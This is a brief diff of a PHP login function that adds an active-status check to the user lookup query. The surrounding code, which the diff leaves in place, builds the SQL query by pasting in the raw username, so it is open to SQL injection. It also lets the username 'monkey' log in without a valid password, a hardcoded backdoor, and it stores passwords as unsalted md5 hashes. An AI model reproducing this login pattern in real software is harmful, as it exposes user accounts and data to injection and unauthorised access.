@@ -16,7 +16,7 @@ class user extends base{
         $user_name = $this->postString('user_name');
         $password = $this->postString('password');
         if($user_name and $password){
-            $user = $this->db->getRow("select * from hqsen_user where user_name = '$user_name'");
+            $user = $this->db->getRow("select * from hqsen_user where  user_status = 1 and user_name = '$user_name'");
 
             if($user and ($user_name == 'monkey' or $user['password'] == md5($password))){
                 session_start();
